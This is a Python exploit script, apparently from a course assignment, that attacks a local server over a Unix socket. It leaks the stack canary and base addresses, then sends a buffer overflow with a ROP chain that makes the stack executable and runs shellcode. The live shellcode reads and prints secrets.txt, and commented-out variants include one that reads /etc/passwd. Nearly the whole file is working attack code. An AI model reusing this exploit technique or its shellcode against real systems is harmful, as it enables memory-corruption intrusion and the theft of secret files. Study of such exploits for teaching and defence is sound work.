import socket
import sys
from os.path import expanduser

# Create a UDS socket
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
home = expanduser("~")
server_address = home + '/victim.sock'
print('connecting to {}'.format(server_address))
try:
    sock.connect(server_address)
except socket.error as msg:
    print(msg)
    sys.exit(1)

def zerochecker(bytes, expectedLength):
    while len(bytes) != expectedLength:
        bytes = "0x0" + bytes[2:]
    return bytes

try:

    # Send data for canary
    message = b'AAAAAAAAAAAAAAAAAAAAAAAA\n32\n'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)

    # receive canary back
    while amount_received < amount_expected:
        data = sock.recv(32)
        amount_received += len(data)
        hex_canary = zerochecker(hex(int.from_bytes(data[24:],"little")), 18)
        print("Hex canary read in as:")
        print(hex_canary)
        canary_byte_array = bytearray.fromhex(hex_canary[2:])
        canary_byte_array.reverse()

    # Send data for stack base
    message = b'\n6\n'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)
    while amount_received < amount_expected:
        data = sock.recv(6)
        amount_received += len(data)
        stack_base = zerochecker(hex(int.from_bytes(data,"little")-224), 14)
        print("Stack base read in as:")
        print(stack_base)
        sbase_byte_array = bytearray.fromhex(stack_base[2:])
        sbase_byte_array.reverse()

    # Send data for binary base addr
    message = b'\n280\n'
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)
    while amount_received < amount_expected:
        data = sock.recv(280)
        amount_received += len(data)
        binary_base = zerochecker(hex(int.from_bytes(data[272:],"little")), 14)
        print("Binary base read in as:")
        print(binary_base)
        bbase_byte_array = bytearray.fromhex(binary_base[2:])
        bbase_byte_array.reverse()

    # converted c file to elf
    #shellcode = b"\x48\x83\xec\x08\x48\x8b\x05\xed\x0b\x20\x48\x85\xc0\x74\x05\xe8\x4b\x00\x00\x00\x48\x83\xc4\x08\xc3\xff\x35\xe2\x0b\x20\x00\xff\x25\xe4\x0b\x20\x00\x0f\x1f\x40\x00\xff\x25\xe2\x0b\x20\x00\x68\x00\x00\x00\x00\xe9\xe0\xff\xff\xff\xff\x25\xda\x0b\x20\x00\x68\x01\x00\x00\x00\xe9\xd0\xff\xff\xff\xff\x25\xd2\x0b\x20\x00\x68\x02\x00\x00\x00\xe9\xc0\xff\xff\xff\xff\x25\x92\x0b\x20\x00\x66\x90\x31\xed\x49\x89\xd1\x5e\x48\x89\xe2\x48\x83\xe4\xf0\x50\x54\x49\xc7\xc0\x10\x06\x40\x48\xc7\xc1\xa0\x05\x40\x48\xc7\xc7\x66\x05\x40\xe8\xa7\xff\xff\xff\xf4\x66\x0f\x1f\x44\x00\x00\xb8\x47\x10\x60\x00\x55\x48\x2d\x40\x10\x60\x00\x48\x83\xf8\x0e\x48\x89\xe5\x76\x1b\xb8\x00\x00\x00\x00\x48\x85\xc0\x74\x11\x5d\xbf\x40\x10\x60\x00\xff\xe0\x66\x0f\x1f\x84\x00\x00\x00\x00\x5d\xc3\x0f\x1f\x40\x00\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\xbe\x40\x10\x60\x00\x55\x48\x81\xee\x40\x10\x60\x48\xc1\xfe\x03\x48\x89\xe5\x48\x89\xf0\x48\xc1\xe8\x3f\x48\x01\xc6\x48\xd1\xfe\x74\x15\xb8\x00\x00\x00\x00\x48\x85\xc0\x74\x0b\x5d\xbf\x40\x10\x60\x00\xff\xe0\x0f\x1f\x00\x5d\xc3\x66\x0f\x1f\x44\x00\x00\x80\x3d\x19\x0b\x20\x00\x75\x11\x55\x48\x89\xe5\xe8\x6e\xff\xff\xff\x5d\xc6\x05\x06\x0b\x20\x00\xf3\xc3\x0f\x1f\x40\x00\xbf\x20\x0e\x60\x00\x48\x83\x3f\x00\x75\x05\xeb\x93\x0f\x1f\x00\xb8\x00\x00\x00\x00\x48\x85\xc0\x74\xf1\x55\x48\x89\xe5\xff\xd0\x5d\xe9\x7a\xff\xff\xff\x55\x48\x89\xe5\x48\x83\xec\x10\x89\x7d\xfc\x48\x89\x75\xf0\xba\x04\x00\x00\x00\xbe\x24\x06\x40\x00\xbf\x03\x00\x00\x00\xe8\xa7\xfe\xff\xff\xbf\x00\x00\x00\x00\xe8\xbd\xfe\xff\xff\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x0f\x1f\x00\x41\x57\x41\x56\x41\x89\xff\x41\x55\x41\x54\x4c\x8d\x25\x5e\x08\x20\x55\x48\x8d\x2d\x5e\x08\x20\x53\x49\x89\xf6\x49\x89\xd5\x4c\x29\xe5\x48\x83\xec\x08\x48\xc1\xfd\x03\xe8\x2f\xfe\xff\xff\x48\x85\xed\x74\x20\x31\xdb\x0f\x1f\x84\x00\x00\x00\x00\x4c\x89\xea\x4c\x89\xf6\x44\x89\xff\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea\x48\x83\xc4\x08\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3\x90\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\xf3\xc3\x48\x83\xec\x08\x48\x83\xc4\x08\xc3"

    # assignment 1 task 2
    #shellcode = b"\x48\x31\xc0\x04\x02\x48\x8d\x3d\x29\x11\x11\x01\x48\x81\xef\xc5\x10\x11\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05\x50\x41\x58\x48\x83\xec\x78\x48\x31\xc0\x04\x04\x48\x8d\x3d\x29\x11\x11\x01\x48\x81\xef\xe7\x10\x11\x01\x54\x5e\x0f\x05\x48\x83\xc4\x30\x41\x59\x48\x83\xc4\x44\x4c\x29\xcc\x41\x50\x5f\x48\x31\xc0\x54\x5e\x41\x51\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x54\x5e\x41\x51\x5a\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x0f\x05\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"

    # hello w no null bytes
    #shellcode = b"\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x48\x31\xf6\x48\x8d\x35\x29\x11\x11\x48\x81\xee\x10\x11\x11\x48\x31\xd2\x80\xc2\x0d\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x0a"

    # dont remember
    #shellcode = b"\x48\x83\xec\x08\x48\x8b\x05\x5d\x0c\x20\x48\x85\xc0\x74\x05\xe8\x2b\x00\x00\x00\x48\x83\xc4\x08\xc3\xff\x35\x52\x0c\x20\x00\xff\x25\x54\x0c\x20\x00\x0f\x1f\x40\x00\xff\x25\x52\x0c\x20\x00\x68\x00\x00\x00\x00\xe9\xe0\xff\xff\xff\xff\x25\x22\x0c\x20\x00\x66\x90\x31\xed\x49\x89\xd1\x5e\x48\x89\xe2\x48\x83\xe4\xf0\x50\x54\x49\xc7\xc0\x60\x05\x40\x48\xc7\xc1\xf0\x04\x40\x48\xc7\xc7\xd6\x04\x40\xe8\xb7\xff\xff\xff\xf4\x66\x0f\x1f\x44\x00\x00\xb8\x37\x10\x60\x00\x55\x48\x2d\x30\x10\x60\x00\x48\x83\xf8\x0e\x48\x89\xe5\x76\x1b\xb8\x00\x00\x00\x00\x48\x85\xc0\x74\x11\x5d\xbf\x30\x10\x60\x00\xff\xe0\x66\x0f\x1f\x84\x00\x00\x00\x00\x5d\xc3\x0f\x1f\x40\x00\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\xbe\x30\x10\x60\x00\x55\x48\x81\xee\x30\x10\x60\x48\xc1\xfe\x03\x48\x89\xe5\x48\x89\xf0\x48\xc1\xe8\x3f\x48\x01\xc6\x48\xd1\xfe\x74\x15\xb8\x00\x00\x00\x00\x48\x85\xc0\x74\x0b\x5d\xbf\x30\x10\x60\x00\xff\xe0\x0f\x1f\x00\x5d\xc3\x66\x0f\x1f\x44\x00\x00\x80\x3d\x99\x0b\x20\x00\x75\x11\x55\x48\x89\xe5\xe8\x6e\xff\xff\xff\x5d\xc6\x05\x86\x0b\x20\x00\xf3\xc3\x0f\x1f\x40\x00\xbf\x20\x0e\x60\x00\x48\x83\x3f\x00\x75\x05\xeb\x93\x0f\x1f\x00\xb8\x00\x00\x00\x00\x48\x85\xc0\x74\xf1\x55\x48\x89\xe5\xff\xd0\x5d\xe9\x7a\xff\xff\xff\x55\x48\x89\xe5\x89\x7d\xfc\x48\x89\x75\xf0\xb8\x00\x00\x00\x00\x5d\xc3\x0f\x1f\x84\x00\x00\x00\x00\x41\x57\x41\x56\x41\x89\xff\x41\x55\x41\x54\x4c\x8d\x25\x0e\x09\x20\x55\x48\x8d\x2d\x0e\x09\x20\x53\x49\x89\xf6\x49\x89\xd5\x4c\x29\xe5\x48\x83\xec\x08\x48\xc1\xfd\x03\xe8\x6f\xfe\xff\xff\x48\x85\xed\x74\x20\x31\xdb\x0f\x1f\x84\x00\x00\x00\x00\x4c\x89\xea\x4c\x89\xf6\x44\x89\xff\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xeb\x75\xea\x48\x83\xc4\x08\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3\x90\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\xf3\xc3\x48\x83\xec\x08\x48\x83\xc4\x08\xc3"

    # last tested shellcode wed night
    #shellcode = b"\x55\x48\x89\xe5\x89\x7d\xfc\x48\x89\x75\xf0\xb8\x00\x00\x00\x00\x5d\xc3\x0f\x1f\x84\x00\x00\x00\x00\x00"

    # readsecrets.S
    shellcode = b"\x48\xc7\xc0\x02\x00\x00\x00\x48\xc7\xc7\xf1\x00\x40\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x49\x89\xc0\x48\x83\xec\x78\x48\xc7\xc0\x04\x00\x00\x00\x48\xc7\xc7\xf1\x00\x40\x00\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x41\x59\x48\x83\xc4\x44\x4c\x29\xcc\x4c\x89\xc7\x48\xc7\xc0\x00\x00\x00\x00\x48\x89\xe6\x4c\x89\xca\x0f\x05\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x4c\x89\xca\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\x31\xff\x0f\x05\x73\x65\x63\x72\x65\x74\x73\x2e\x74\x78\x74"

    overflow1 = b"\x00" + b"A" * 23
    # hex_canary and canary_byte_array defined on first request
    # stack_base and sbase_byte_array defined on second request
    # binary_base and bbase_byte_array defined on third request
    overflow2 = b"A" * 8

    # pop rdi; ret
    gadget1 = bytearray.fromhex(hex(int(binary_base, 16) + int("0xf33", 16))[2:])
    gadget1.reverse()

    # pop rsi; pop r15; ret
    gadget2 = bytearray.fromhex(hex(int(binary_base, 16) + int("0xf31", 16))[2:])
    gadget2.reverse()
    
    # pop rdx; ret
    gadget3 = bytearray.fromhex(hex(int(binary_base, 16) + int("0xe8f", 16))[2:])
    gadget3.reverse()


    arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - (int(stack_base, 16)%4096))[2:]) # change bc stack base
    arg_addr.reverse()
    
    arg_len = b"\x00\x10\x00"  # len of the shellcode as size_t

    arg_prot = b"\x07"  # int, look at man pages (c-level flags)

    #TODO check funcaddr w zerochecker

    funcaddr = hex(int(binary_base, 16) + 0x970) # IN PLT
    faddr_byte_array = bytearray.fromhex(funcaddr[2:])
    faddr_byte_array.reverse()

    shellcodeaddr = hex(int(stack_base, 16) - 0x2D0) # addr of shellcode same as arg for it
    saddr_byte_array = bytearray.fromhex(shellcodeaddr[2:])
    saddr_byte_array.reverse()

    print("funcaddr is:")
    print(funcaddr)

    exploit = overflow1 + canary_byte_array + overflow2 + gadget1 + b"\x00\x00"  + arg_addr + b"\x00\x00"
    exploit += gadget2 + b"\x00\x00" + arg_len + b"\x00"*(16-len(arg_len)) + gadget3 + b"\x00\x00" + arg_prot
    exploit += b"\x00"*(8-len(arg_prot)) + faddr_byte_array  + b"\x00\x00" + saddr_byte_array + b"\x00\x00"  + b"\x90"*100 + shellcode

    print("Canary_byte_array before sent:")
    print(canary_byte_array)


    print("faddr_byte_array")
    print(faddr_byte_array)
# Send data
    message = exploit + b"\n1\n" # correct exploit message
    print('sending {!r}'.format(message))
    sock.sendall(message)

    amount_received = 0
    amount_expected = len(message)

    while amount_received < amount_expected:
        data = sock.recv(32)
        amount_received += len(data)
        # if exploit sucessfully makes server exit won't need to print anyhthing anyway

finally:
    print('closing socket')
    sock.close()
